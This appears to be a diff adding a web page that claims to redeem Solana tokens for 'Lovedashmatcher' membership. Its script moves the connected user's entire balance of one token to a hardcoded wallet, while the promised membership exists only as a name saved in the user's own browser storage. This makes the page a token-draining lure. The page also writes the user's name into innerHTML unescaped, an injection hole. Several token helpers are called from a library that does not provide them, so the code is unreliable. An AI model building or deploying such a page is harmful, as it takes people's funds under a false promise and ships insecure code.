@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Token Redeemer for Lovedashmatcher</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        input, button { margin: 10px 0; padding: 10px; width: 100%; box-sizing: border-box; }
+        #status { margin-top: 20px; padding: 10px; border: 1px solid #ccc; }
+    </style>
+</head>
+<body>
+    <h1>Redeem Tokens for Lovedashmatcher Membership</h1>
+    <p>This will transfer ALL your tokens of the specified mint to the destination wallet in exchange for membership.</p>
+    <p>Ensure you have enough SOL for fees.</p>
+
+    <button id="connectBtn">Connect Phantom Wallet</button>
+    <div id="walletInfo" style="display: none;">
+        <p>Connected: <span id="walletAddress"></span></p>
+    </div>
+
+    <input type="text" id="nameInput" placeholder="Enter your name for membership" required>
+    <button id="redeemBtn" style="display: none;" disabled>Redeem Tokens</button>
+
+    <div id="status"></div>
+
+    <script>
+        const RPC_ENDPOINT = "https://api.mainnet-beta.solana.com";
+        const MINT_ADDRESS = "5jriAd8yM9fRzuisg54Ch1k8sAmmbqRUfWKu87tRpump";
+        const DEST_OWNER_ADDRESS = "HU22vPJUU36SrKzLfmq77ci3mzSQWwWUkkmbNjT8GEN4";
+        const DECIMALS = 6;
+        const MEMBERS_KEY = "lovedashmatcher_members";
+
+        const connection = new solanaWeb3.Connection(RPC_ENDPOINT);
+        const mint = new solanaWeb3.PublicKey(MINT_ADDRESS);
+        const destOwner = new solanaWeb3.PublicKey(DEST_OWNER_ADDRESS);
+
+        let wallet;
+        let walletPublicKey;
+
+        const connectBtn = document.getElementById('connectBtn');
+        const walletInfo = document.getElementById('walletInfo');
+        const walletAddress = document.getElementById('walletAddress');
+        const nameInput = document.getElementById('nameInput');
+        const redeemBtn = document.getElementById('redeemBtn');
+        const status = document.getElementById('status');
+
+        function updateStatus(msg, isError = false) {
+            status.innerHTML = `<p style="color: ${isError ? 'red' : 'green'};">${msg}</p>`;
+        }
+
+        function loadMembers() {
+            return JSON.parse(localStorage.getItem(MEMBERS_KEY) || '[]');
+        }
+
+        function saveMembers(members) {
+            localStorage.setItem(MEMBERS_KEY, JSON.stringify(members));
+        }
+
+        function addMember(name) {
+            const members = loadMembers();
+            if (!members.includes(name)) {
+                members.push(name);
+                saveMembers(members);
+                updateStatus(`Membership granted! Name '${name}' added to local members list.`);
+                console.log('Members:', members); // For local inspection
+            } else {
+                updateStatus(`Name '${name}' already a member.`);
+            }
+        }
+
+        connectBtn.addEventListener('click', async () => {
+            if ('solana' in window) {
+                try {
+                    wallet = window.solana;
+                    await wallet.connect();
+                    walletPublicKey = wallet.publicKey;
+                    walletAddress.textContent = walletPublicKey.toBase58();
+                    walletInfo.style.display = 'block';
+                    redeemBtn.disabled = false;
+                    redeemBtn.style.display = 'block';
+                    updateStatus('Wallet connected successfully.');
+                } catch (err) {
+                    updateStatus(`Connection failed: ${err.message}`, true);
+                }
+            } else {
+                updateStatus('Phantom wallet not found. Please install Phantom.', true);
+            }
+        });
+
+        redeemBtn.addEventListener('click', async () => {
+            const name = nameInput.value.trim();
+            if (!name) {
+                updateStatus('Name is required.', true);
+                return;
+            }
+
+            if (!walletPublicKey) {
+                updateStatus('Wallet not connected.', true);
+                return;
+            }
+
+            try {
+                updateStatus('Checking balance...');
+                const sourceAta = await solanaWeb3.getAssociatedTokenAddress(mint, walletPublicKey);
+                const sourceAccount = await connection.getTokenAccountBalance(sourceAta);
+
+                if (!sourceAccount.value) {
+                    updateStatus('No token account found or no balance.', true);
+                    return;
+                }
+
+                const amount = sourceAccount.value.amount;
+                if (Number(amount) === 0) {
+                    updateStatus('No tokens to transfer.', true);
+                    return;
+                }
+
+                const tokenAmount = Number(amount) / Math.pow(10, DECIMALS);
+                updateStatus(`Transferring ${tokenAmount} tokens...`);
+
+                const destAta = await solanaWeb3.getAssociatedTokenAddress(mint, destOwner);
+                const destAccount = await connection.getAccountInfo(destAta);
+
+                const transaction = new solanaWeb3.Transaction();
+
+                if (!destAccount) {
+                    const createIx = solanaWeb3.createAssociatedTokenAccountInstruction(
+                        walletPublicKey, // payer
+                        destAta,
+                        destOwner,
+                        mint
+                    );
+                    transaction.add(createIx);
+                    updateStatus('Creating destination token account...');
+                }
+
+                const transferIx = solanaWeb3.createTransferCheckedInstruction(
+                    sourceAta,
+                    mint,
+                    destAta,
+                    walletPublicKey,
+                    amount,
+                    DECIMALS
+                );
+                transaction.add(transferIx);
+
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = walletPublicKey;
+
+                const signedTransaction = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                await connection.confirmTransaction(signature);
+
+                updateStatus(`Transaction sent! Signature: ${signature}`);
+                addMember(name);
+
+            } catch (err) {
+                updateStatus(`Error: ${err.message}`, true);
+                console.error(err);
+            }
+        });
+
+        // Auto-connect if already connected
+        if (window.solana && window.solana.isPhantom) {
+            window.solana.connect({ onlyIfTrusted: true }).then(() => {
+                // Connected
+            }).catch(() => {
+                // Not connected, do nothing
+            });
+        }
+    </script>
+</body>
+</html>
